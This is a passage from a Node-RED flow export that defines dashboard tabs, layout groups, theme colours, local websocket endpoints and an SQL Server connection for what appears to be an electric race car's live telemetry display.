[
    {
        "id": "8c02145f70bf7c6a",
        "type": "tab",
        "label": "General",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "149f680d508ad4ad",
        "type": "tab",
        "label": "Warnings",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "4a2f2f6c3794d699",
        "type": "tab",
        "label": "MC",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "2b8b862ad49c5254",
        "type": "tab",
        "label": "Cooling",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "c91b7712e66969da",
        "type": "tab",
        "label": "EV Critical",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "54ee7ab52b252314",
        "type": "tab",
        "label": "EV Useful",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "594e9fd18f91cc50",
        "type": "tab",
        "label": "EV Other",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "145277527b95dd1c",
        "type": "tab",
        "label": "Suspension",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "0208dc768b26306e",
        "type": "tab",
        "label": "General Past Data",
        "disabled": true,
        "info": "",
        "env": []
    },
    {
        "id": "eb28fbcf28e5aae9",
        "type": "tab",
        "label": "General Past Data Single Chart",
        "disabled": true,
        "info": "",
        "env": []
    },
    {
        "id": "a5a35a884df38a1a",
        "type": "tab",
        "label": "MC Past Data",
        "disabled": true,
        "info": "",
        "env": []
    },
    {
        "id": "58631339f9f9424f",
        "type": "tab",
        "label": "EV Critical Past Data",
        "disabled": true,
        "info": "",
        "env": []
    },
    {
        "id": "ff20928492ae8b0d",
        "type": "tab",
        "label": "Test",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "bad166ee0ebb9845",
        "type": "tab",
        "label": "General (NEW)",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "bda8997ed28d204b",
        "type": "tab",
        "label": "MC (NEW)",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "243a5262a5129260",
        "type": "tab",
        "label": "Warnings (NEW)",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "5be5a18d72229f60",
        "type": "tab",
        "label": "Suspension (NEW)",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "43c8977d5bb940cf",
        "type": "tab",
        "label": "Cooling (NEW)",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "f794ff764964069d",
        "type": "tab",
        "label": "Accumulator (NEW)",
        "disabled": false,
        "info": "Replacing old EV pages",
        "env": []
    },
    {
        "id": "933ce03686fddbab",
        "type": "MSSQL-CN",
        "tdsVersion": "7_4",
        "name": "litel SQL Server",
        "server": "20.81.190.176",
        "port": "1433",
        "encyption": true,
        "trustServerCertificate": true,
        "database": "Live Telemetry",
        "useUTC": true,
        "connectTimeout": "15000",
        "requestTimeout": "15000",
        "cancelTimeout": "5000",
        "pool": "5",
        "parseJSON": false,
        "enableArithAbort": true
    },
    {
        "id": "6988e854229f01bb",
        "type": "ui_tab",
        "name": "EV Useful",
        "icon": "dashboard",
        "order": 6,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "e143306a96f4ee24",
        "type": "ui_base",
        "theme": {
            "name": "theme-custom",
            "lightTheme": {
                "default": "#0094CE",
                "baseColor": "#0061ff",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "edited": true,
                "reset": false
            },
            "darkTheme": {
                "default": "#097479",
                "baseColor": "#0433ff",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "edited": true,
                "reset": false
            },
            "customTheme": {
                "name": "Pitt Theme 1",
                "default": "#4B7930",
                "baseColor": "#ffffff",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "reset": false
            },
            "themeState": {
                "base-color": {
                    "default": "#4B7930",
                    "value": "#ffffff",
                    "edited": true
                },
                "page-titlebar-backgroundColor": {
                    "value": "#ffb81c",
                    "edited": true
                },
                "page-backgroundColor": {
                    "value": "#003594",
                    "edited": true
                },
                "page-sidebar-backgroundColor": {
                    "value": "#003594",
                    "edited": true
                },
                "group-textColor": {
                    "value": "#ffb81c",
                    "edited": true
                },
                "group-borderColor": {
                    "value": "#003594",
                    "edited": true
                },
                "group-backgroundColor": {
                    "value": "#003594",
                    "edited": true
                },
                "widget-textColor": {
                    "value": "#111111",
                    "edited": false
                },
                "widget-backgroundColor": {
                    "value": "#003594",
                    "edited": true
                },
                "widget-borderColor": {
                    "value": "#ffffff",
                    "edited": true
                },
                "base-font": {
                    "value": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"
                }
            },
            "angularTheme": {
                "primary": "indigo",
                "accents": "blue",
                "warn": "red",
                "background": "grey",
                "palette": "light"
            }
        },
        "site": {
            "name": "Node-RED Dashboard",
            "hideToolbar": "false",
            "allowSwipe": "false",
            "lockMenu": "false",
            "allowTempTheme": "true",
            "dateFormat": "DD/MM/YYYY",
            "sizes": {
                "sx": 48,
                "sy": 48,
                "gx": 3,
                "gy": 6,
                "cx": 6,
                "cy": 6,
                "px": 0,
                "py": 0
            }
        }
    },
    {
        "id": "0792dde75d0b55e3",
        "type": "ui_group",
        "name": "EV_Useful",
        "tab": "6988e854229f01bb",
        "order": 2,
        "disp": true,
        "width": "60",
        "collapse": false,
        "className": ""
    },
    {
        "id": "c46b2c1ea6e37152",
        "type": "ui_tab",
        "name": "EV Critical",
        "icon": "dashboard",
        "order": 5,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "9f715c58ec97d4b1",
        "type": "ui_group",
        "name": "EV_Critical",
        "tab": "c46b2c1ea6e37152",
        "order": 2,
        "disp": true,
        "width": "60",
        "collapse": false,
        "className": ""
    },
    {
        "id": "b5264e960f9eb7eb",
        "type": "ui_group",
        "name": "EV_Other",
        "tab": "de192e18d9a5b7a3",
        "order": 2,
        "disp": true,
        "width": "60",
        "collapse": false,
        "className": ""
    },
    {
        "id": "de192e18d9a5b7a3",
        "type": "ui_tab",
        "name": "EV Other",
        "icon": "dashboard",
        "order": 7,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "c012dff6afbc6486",
        "type": "ui_tab",
        "name": "General",
        "icon": "dashboard",
        "order": 1,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "1fc0dcc2cd8a691a",
        "type": "ui_group",
        "name": "Others",
        "tab": "c012dff6afbc6486",
        "order": 17,
        "disp": true,
        "width": "60",
        "collapse": false,
        "className": ""
    },
    {
        "id": "a5f2ac06c2cd3214",
        "type": "ui_tab",
        "name": "MC",
        "icon": "dashboard",
        "order": 3,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "4dce402db33a1ac6",
        "type": "ui_group",
        "name": "MC",
        "tab": "a5f2ac06c2cd3214",
        "order": 2,
        "disp": true,
        "width": "60",
        "collapse": false,
        "className": ""
    },
    {
        "id": "07c9feb509957806",
        "type": "ui_group",
        "name": "Temperatures",
        "tab": "c012dff6afbc6486",
        "order": 7,
        "disp": true,
        "width": "60",
        "collapse": false,
        "className": ""
    },
    {
        "id": "b1fa7a4b77652777",
        "type": "ui_group",
        "name": "Speeds",
        "tab": "c012dff6afbc6486",
        "order": 2,
        "disp": true,
        "width": "60",
        "collapse": false,
        "className": ""
    },
    {
        "id": "33c8b737093be8e2",
        "type": "ui_group",
        "name": "Battery Stats",
        "tab": "c012dff6afbc6486",
        "order": 12,
        "disp": true,
        "width": "60",
        "collapse": false,
        "className": ""
    },
    {
        "id": "092d587d2f13b174",
        "type": "ui_tab",
        "d": true,
        "name": "General Past Data",
        "icon": "dashboard",
        "order": 8,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "881b1308b85cd435",
        "type": "ui_group",
        "name": "Past Data View",
        "tab": "092d587d2f13b174",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "f5d559db1bfa8c5b",
        "type": "ui_tab",
        "name": "General Past Data Single Chart",
        "icon": "dashboard",
        "order": 9,
        "disabled": true,
        "hidden": false
    },
    {
        "id": "138120695bcd6cbc",
        "type": "ui_group",
        "name": "Past Data 2",
        "tab": "f5d559db1bfa8c5b",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "a0f03a3236d45623",
        "type": "ui_tab",
        "name": "MC Past Data",
        "icon": "dashboard",
        "order": 10,
        "disabled": true,
        "hidden": false
    },
    {
        "id": "37fa01b38570666f",
        "type": "ui_group",
        "name": "MC Past Data",
        "tab": "a0f03a3236d45623",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "524b980f49e1c16c",
        "type": "ui_tab",
        "name": "EV Critical Past Data",
        "icon": "dashboard",
        "order": 11,
        "disabled": true,
        "hidden": false
    },
    {
        "id": "7f4edb2103a1ccbd",
        "type": "ui_group",
        "name": "EV Critical Past Data",
        "tab": "524b980f49e1c16c",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "24b040a09058c6d9",
        "type": "ui_tab",
        "name": "Warnings",
        "icon": "dashboard",
        "order": 2,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "879eba49fd286672",
        "type": "ui_group",
        "name": "Warnings",
        "tab": "24b040a09058c6d9",
        "order": 4,
        "disp": true,
        "width": "60",
        "collapse": false,
        "className": ""
    },
    {
        "id": "90bb443c7deb3cd0",
        "type": "ui_group",
        "name": "Cooling",
        "tab": "3002639870ea08ed",
        "order": 1,
        "disp": true,
        "width": "60",
        "collapse": false,
        "className": ""
    },
    {
        "id": "3002639870ea08ed",
        "type": "ui_tab",
        "name": "Cooling",
        "icon": "dashboard",
        "order": 4,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "24a6908befd530f1",
        "type": "ui_group",
        "name": "Connection Info",
        "tab": "c012dff6afbc6486",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "e65d294bda0561b4",
        "type": "ui_group",
        "name": "Latency",
        "tab": "24b040a09058c6d9",
        "order": 1,
        "disp": true,
        "width": "60",
        "collapse": false,
        "className": ""
    },
    {
        "id": "2a5cf11e0b167099",
        "type": "ui_group",
        "name": "Latency",
        "tab": "a5f2ac06c2cd3214",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "606ed3aaa13d01f2",
        "type": "ui_group",
        "name": "Latency",
        "tab": "c46b2c1ea6e37152",
        "order": 1,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "7b787f4fad695373",
        "type": "ui_group",
        "name": "Latency",
        "tab": "6988e854229f01bb",
        "order": 1,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "dbbdedbe852cd727",
        "type": "ui_group",
        "name": "Latency",
        "tab": "de192e18d9a5b7a3",
        "order": 1,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "b3e921438611f1ef",
        "type": "websocket-client",
        "path": "ws://localhost:8080",
        "tls": "",
        "wholemsg": "false",
        "hb": "0",
        "subprotocol": ""
    },
    {
        "id": "31337e6096350fd4",
        "type": "websocket-listener",
        "path": "ws://localhost:8080",
        "wholemsg": "false"
    },
    {
        "id": "22c046d767615b5d",
        "type": "ui_tab",
        "name": "Suspension",
        "icon": "dashboard",
        "disabled": false,
        "hidden": false
    },
    {
        "id": "845364a43a3acf72",
        "type": "ui_group",
        "name": "Suspension",
        "tab": "22c046d767615b5d",
        "order": 1,
        "disp": true,
        "width": "60",
        "collapse": false,
        "className": ""
    },
    {
        "id": "34cf3565746645b2",
        "type": "ui_group",
        "name": "Latency - Col 1",
        "tab": "24b040a09058c6d9",
        "order": 2,
        "disp": false,
        "width": "5",
        "collapse": false,
        "className": ""
    },
    {
        "id": "c6083e7c4b981093",
        "type": "ui_group",
        "name": "Latency - Col 2",
        "tab": "24b040a09058c6d9",
        "order": 3,
        "disp": false,
        "width": "5",
        "collapse": false,
        "className": ""
    },
    {
        "id": "04e08631e84058db",
        "type": "ui_group",
        "name": "Warnings - Col 1",
        "tab": "24b040a09058c6d9",
        "order": 5,
        "disp": false,
        "width": "4",
        "collapse": false,
        "className": ""
    },
    {
        "id": "1b5ca029a6d0ac27",
        "type": "ui_group",
        "name": "Warnings - Col 2",
        "tab": "24b040a09058c6d9",
        "order": 6,
        "disp": false,
        "width": "4",
        "collapse": false,
        "className": ""
    },
    {
        "id": "9e9852155f05fbbc",
        "type": "ui_group",
        "name": "Warnings - Col 3",
        "tab": "24b040a09058c6d9",
        "order": 7,
        "disp": false,
        "width": "4",
        "collapse": false,
        "className": ""
    },
    {
        "id": "1b4bef3241514c07",
        "type": "ui_group",
        "name": "Warnings - Col 4",
        "tab": "24b040a09058c6d9",
        "order": 8,
        "disp": false,
        "width": "4",
        "collapse": false,
        "className": ""
    },
    {
        "id": "c965a10c47bab615",
        "type": "ui_group",
        "name": "Warnings - Col 5",
        "tab": "24b040a09058c6d9",
        "order": 9,
        "disp": false,
        "width": "4",
        "collapse": false,
        "className": ""
    },
    {
        "id": "14f3e47aed581013",
        "type": "ui_group",
        "name": "Warnings - Col 6",
        "tab": "24b040a09058c6d9",
        "order": 10,
        "disp": false,
        "width": "4",
        "collapse": false,
        "className": ""
    },
    {
        "id": "c50189d88cd6068b",
        "type": "ui_group",
        "name": "Warnings - Col 7",
        "tab": "24b040a09058c6d9",
        "order": 11,
        "disp": false,
        "width": "4",
        "collapse": false,
        "className": ""
    },
    {
        "id": "0cf85133b3d4862f",
        "type": "ui_spacer",
        "z": "149f680d508ad4ad",
        "name": "spacer",
        "group": "879eba49fd286672",
        "order": 4,
        "width": "60",
        "height": "1"
    },
    {
        "id": "bfcbad9737fef678",
        "type": "ui_spacer",
        "z": "149f680d508ad4ad",
        "name": "spacer",
        "group": "e65d294bda0561b4",
        "order": 1,
        "width": "60",
        "height": "1"
    },
    {
        "id": "5cf783589dfd8573",
        "type": "remote-config",
        "name": "Node-RED UI",
        "host": "localhost",
        "protocol": "http",
        "port": "1880",
        "baseurl": "/ui",
        "instancehash": "673qlzxncmqygs10onmqcnvx650gr7uswo8dgwlz7puggr39fcjkn4gmi3u9s493",
        "server": "nodered04.remote-red.com",
        "region": "us"
    },
    {
        "id": "15b83a93b8aeb423",
        "type": "ui_group",
        "name": "Speeds - Col 1",
        "tab": "c012dff6afbc6486",
        "order": 3,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "cfb5d6237495813d",
        "type": "ui_group",
        "name": "Speeds - Col 2",
        "tab": "c012dff6afbc6486",
        "order": 4,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "c9cc447ccf221888",
        "type": "ui_group",
        "name": "Speeds - Col 3",
        "tab": "c012dff6afbc6486",
        "order": 5,
        "disp": true,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "011feeb1b9590f82",
        "type": "ui_group",
        "name": "Speeds - Col 4",
        "tab": "c012dff6afbc6486",
        "order": 6,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "dd36ccb6f0f865ca",
        "type": "ui_spacer",
        "z": "8c02145f70bf7c6a",
        "name": "spacer",
        "group": "b1fa7a4b77652777",
        "order": 2,
        "width": "1",
        "height": "1"
    },
    {
        "id": "946c5626540ca018",
        "type": "ui_spacer",
        "z": "8c02145f70bf7c6a",
        "name": "spacer",
        "group": "24a6908befd530f1",
        "order": 6,
        "width": 7,
        "height": 1
    },
    {
        "id": "4e831187d4f547c0",
        "type": "ui_spacer",
        "z": "8c02145f70bf7c6a",
        "name": "spacer",
        "group": "07c9feb509957806",
        "order": 3,
        "width": "1",
        "height": "1"
    },
    {
        "id": "5c9e22e4c6a3ca80",
        "type": "ui_spacer",
        "z": "8c02145f70bf7c6a",
        "name": "spacer",
        "group": "33c8b737093be8e2",
        "order": 14,
        "width": "1",
        "height": "1"
    },
    {
        "id": "1b44b4e57061d99e",
        "type": "ui_spacer",
        "z": "8c02145f70bf7c6a",
        "name": "spacer",
        "group": "1fc0dcc2cd8a691a",
        "order": 5,
        "width": "1",
        "height": "1"
    },
    {
        "id": "242d0f1a2158f91f",
        "type": "ui_group",
        "name": "Temps - Col 1",
        "tab": "c012dff6afbc6486",
        "order": 8,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "571e30aa370a5a0d",
        "type": "ui_group",
        "name": "Temps - Col 2",
        "tab": "c012dff6afbc6486",
        "order": 9,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "201fee83a6989cfc",
        "type": "ui_group",
        "name": "Temps - Col 3",
        "tab": "c012dff6afbc6486",
        "order": 10,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "e0cd3e0af28cd236",
        "type": "ui_group",
        "name": "Temps - Col 4",
        "tab": "c012dff6afbc6486",
        "order": 11,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "7165a152081b3c5c",
        "type": "ui_group",
        "name": "Battery - Col 1",
        "tab": "c012dff6afbc6486",
        "order": 13,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "41f49638027c9f5c",
        "type": "ui_group",
        "name": "Battery - Col 2",
        "tab": "c012dff6afbc6486",
        "order": 14,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "245671b56b55a87a",
        "type": "ui_group",
        "name": "Battery - Col 3",
        "tab": "c012dff6afbc6486",
        "order": 15,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "7d94fd89786fa249",
        "type": "ui_group",
        "name": "Battery - Col 4",
        "tab": "c012dff6afbc6486",
        "order": 16,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "d1250303150aa3f0",
        "type": "ui_group",
        "name": "Others - Col 1",
        "tab": "c012dff6afbc6486",
        "order": 18,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "9fd6ee31836f1727",
        "type": "ui_group",
        "name": "Others - Col 2",
        "tab": "c012dff6afbc6486",
        "order": 19,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "975d0ecd0d497bdd",
        "type": "ui_group",
        "name": "Others - Col 3",
        "tab": "c012dff6afbc6486",
        "order": 20,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "cd96f2ae31dd827a",
        "type": "ui_group",
        "name": "Others - Col 4",
        "tab": "c012dff6afbc6486",
        "order": 21,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "0ad42387414357b3",
        "type": "ui_tab",
        "name": "(TESTING) Litel Site-Development",
        "icon": "dashboard",
        "order": 13,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "b49fa523c2129f05",
        "type": "ui_group",
        "name": "MC - Col 1",
        "tab": "a5f2ac06c2cd3214",
        "order": 3,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "7389cb949baabe46",
        "type": "ui_group",
        "name": "MC - Col 2",
        "tab": "a5f2ac06c2cd3214",
        "order": 4,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "3e5592e7984c84fe",
        "type": "ui_group",
        "name": "MC - Col 3",
        "tab": "a5f2ac06c2cd3214",
        "order": 5,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "0e1238d7f55a6974",
        "type": "ui_group",
        "name": "MC - Col 4",
        "tab": "a5f2ac06c2cd3214",
        "order": 6,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "67d697bbf6160150",
        "type": "ui_spacer",
        "z": "ff20928492ae8b0d",
        "name": "spacer",
        "group": "4dce402db33a1ac6",
        "order": 13,
        "width": 20,
        "height": 1
    },
    {
        "id": "7765e86795d3af12",
        "type": "ui_group",
        "name": "Cooling - Col 1",
        "tab": "3002639870ea08ed",
        "order": 2,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "744c261bf3ffa000",
        "type": "ui_group",
        "name": "Cooling - Col 2",
        "tab": "3002639870ea08ed",
        "order": 3,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "8cb0a474df46243c",
        "type": "ui_group",
        "name": "Cooling - Col 3",
        "tab": "3002639870ea08ed",
        "order": 4,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "f52af5df60607f14",
        "type": "ui_group",
        "name": "Cooling - Col 4",
        "tab": "3002639870ea08ed",
        "order": 5,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "0d09f9a72d240829",
        "type": "ui_spacer",
        "z": "8c02145f70bf7c6a",
        "name": "spacer",
        "group": "90bb443c7deb3cd0",
        "order": 4,
        "width": 1,
        "height": 1
    },
    {
        "id": "c38742dbefd44e87",
        "type": "ui_group",
        "name": "EV_Crit - Col 1",
        "tab": "c46b2c1ea6e37152",
        "order": 3,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "88b49e6ceb25a30a",
        "type": "ui_group",
        "name": "EV_Crit - Col 2",
        "tab": "c46b2c1ea6e37152",
        "order": 4,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "c773bb73ce497e9a",
        "type": "ui_group",
        "name": "EV_Crit - Col 3",
        "tab": "c46b2c1ea6e37152",
        "order": 5,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "580197ebbe9ef12d",
        "type": "ui_group",
        "name": "EV_Crit - Col 4",
        "tab": "c46b2c1ea6e37152",
        "order": 6,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "a97f7f24a9aa0b52",
        "type": "ui_spacer",
        "z": "c91b7712e66969da",
        "name": "spacer",
        "group": "c38742dbefd44e87",
        "order": 8,
        "width": 4,
        "height": 1
    },
    {
        "id": "8508537d7177565d",
        "type": "ui_spacer",
        "z": "c91b7712e66969da",
        "name": "spacer",
        "group": "c38742dbefd44e87",
        "order": 9,
        "width": 4,
        "height": 1
    },
    {
        "id": "d732a4cb12542625",
        "type": "ui_spacer",
        "z": "c91b7712e66969da",
        "name": "spacer",
        "group": "9f715c58ec97d4b1",
        "order": 2,
        "width": 1,
        "height": 1
    },
    {
        "id": "e63418a16c0537d9",
        "type": "ui_group",
        "name": "EV_Other - Col 1",
        "tab": "de192e18d9a5b7a3",
        "order": 3,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "39ac332c647b21aa",
        "type": "ui_group",
        "name": "EV_Other - Col 2",
        "tab": "de192e18d9a5b7a3",
        "order": 4,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "93bfab3c1f52bc9c",
        "type": "ui_group",
        "name": "EV_Other - Col 3",
        "tab": "de192e18d9a5b7a3",
        "order": 5,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "d8a5fe66020a6697",
        "type": "ui_group",
        "name": "EV_Other - Col 4",
        "tab": "de192e18d9a5b7a3",
        "order": 6,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "2765c37e7aa9e5fa",
        "type": "ui_group",
        "name": "EV_Useful - Col 1",
        "tab": "6988e854229f01bb",
        "order": 3,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "99a5eab2c01b6e31",
        "type": "ui_group",
        "name": "EV_Useful - Col 2",
        "tab": "6988e854229f01bb",
        "order": 4,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "32f9514944cd045a",
        "type": "ui_group",
        "name": "EV_Useful - Col 3",
        "tab": "6988e854229f01bb",
        "order": 5,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "9aa6fcac7bcb047b",
        "type": "ui_group",
        "name": "EV_Useful - Col 4",
        "tab": "6988e854229f01bb",
        "order": 6,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "f1c11f3d74a1bf59",
        "type": "ui_spacer",
        "z": "54ee7ab52b252314",
        "name": "spacer",
        "group": "0792dde75d0b55e3",
        "order": 2,
        "width": 1,
        "height": 1
    },
    {
        "id": "21241614a9590c33",
        "type": "ui_spacer",
        "z": "594e9fd18f91cc50",
        "name": "spacer",
        "group": "e63418a16c0537d9",
        "order": 8,
        "width": 4,
        "height": 1
    },
    {
        "id": "7f0edbab13886aed",
        "type": "ui_spacer",
        "z": "594e9fd18f91cc50",
        "name": "spacer",
        "group": "e63418a16c0537d9",
        "order": 9,
        "width": 4,
        "height": 1
    },
    {
        "id": "ea309895d6087a4a",
        "type": "ui_spacer",
        "z": "594e9fd18f91cc50",
        "name": "spacer",
        "group": "b5264e960f9eb7eb",
        "order": 2,
        "width": 1,
        "height": 1
    },
    {
        "id": "ecfced67d8ed028f",
        "type": "ui_group",
        "name": "Suspension - Col 1",
        "tab": "22c046d767615b5d",
        "order": 2,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "d9b31008e688a650",
        "type": "ui_group",
        "name": "Suspension - Col 2",
        "tab": "22c046d767615b5d",
        "order": 3,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "0467436d0e8f2b5d",
        "type": "ui_group",
        "name": "Suspension - Col 3",
        "tab": "22c046d767615b5d",
        "order": 4,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "6339467b612ef059",
        "type": "ui_group",
        "name": "Suspension - Col 4",
        "tab": "22c046d767615b5d",
        "order": 5,
        "disp": false,
        "width": "8",
        "collapse": false,
        "className": ""
    },
    {
        "id": "ae0413d2.d9b4d",
        "type": "ui_group",
        "name": "Dashboard",
        "tab": "0ad42387414357b3",
        "order": 3,
        "disp": true,
        "width": "4",
        "collapse": false
    },
    {
        "id": "ef860366.cd032",
        "type": "ui_group",
        "name": "Charts",
        "tab": "0ad42387414357b3",
        "order": 2,
        "disp": true,
        "width": "6"
    },
    {
        "id": "881ee563.ffb7f8",
        "type": "ui_group",
        "name": "Chart Scaling",
        "tab": "0ad42387414357b3",
        "order": 4,
        "disp": true,
        "width": "3",
        "collapse": true
    },
    {
        "id": "3856d9c7a21f82f5",
        "type": "ui-base",
        "name": "My Dashboard",
        "path": "/dashboard",
        "appIcon": "",
        "includeClientData": true,
        "acceptsClientConfig": [
            "ui-notification",
            "ui-control"
        ],
        "showPathInSidebar": false,
        "showPageTitle": true,
        "navigationStyle": "default",
        "titleBarStyle": "default"
    },
    {
        "id": "3a626e10bf6f4677",
        "type": "ui-page",
        "name": "(TESTING) Litel Site Development",
        "ui": "3856d9c7a21f82f5",
        "path": "/page1",
        "icon": "home",
        "layout": "grid",
        "theme": "352cdd7d7df2f209",
        "breakpoints": [
            {
                "name": "Default",
                "px": "0",
                "cols": "3"
            },
            {
                "name": "Tablet",
                "px": "576",
                "cols": "6"
            },
            {
                "name": "Small Desktop",
                "px": "768",
                "cols": "9"
            },
            {
                "name": "Desktop",
                "px": "1024",
                "cols": "12"
            }
        ],
        "order": 7,
        "className": "",
        "visible": "true",
        "disabled": "false"
    },
    {
        "id": "35fd8ad52955b104",
        "type": "ui-group",
        "name": "My Group",
        "page": "3a626e10bf6f4677",
        "width": "6",
        "height": "1",
        "order": 1,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "6bbce1a2ef54167b",
        "type": "ui-page",
        "z": "bad166ee0ebb9845",
        "name": "General",
        "ui": "3856d9c7a21f82f5",
        "path": "/General",
        "icon": "home",
        "layout": "tabs",
        "theme": "352cdd7d7df2f209",
        "breakpoints": [
            {
                "name": "Default",
                "px": "0",
                "cols": "3"
            },
            {
                "name": "Tablet",
                "px": "576",
                "cols": "6"
            },
            {
                "name": "Small Desktop",
                "px": "768",
                "cols": "9"
            },
            {
                "name": "Desktop",
                "px": "1024",
                "cols": "12"
            }
        ],
        "order": 1,
        "className": "",
        "visible": "true",
        "disabled": "false"
    },
    {
        "id": "ead6d96fd98bb5ec",
        "type": "ui-group",
        "z": "bad166ee0ebb9845",
        "name": "Home",
        "page": "6bbce1a2ef54167b",
        "width": "8",
        "height": "1",
        "order": 1,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "009c8c030a956a93",
        "type": "ui-group",
        "z": "bad166ee0ebb9845",
        "name": "Driver",
        "page": "6bbce1a2ef54167b",
        "width": "18",
        "height": "1",
        "order": 2,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "011e8be3a2ac904a",
        "type": "ui-group",
        "z": "bad166ee0ebb9845",
        "name": "Accumulator",
        "page": "6bbce1a2ef54167b",
        "width": "18",
        "height": "1",
        "order": 3,
        "showTitle": true,
        "className": "",
        "visible": "true",
        "disabled": "false",
        "groupType": "default"
    },
    {
        "id": "352cdd7d7df2f209",
        "type": "ui-theme",
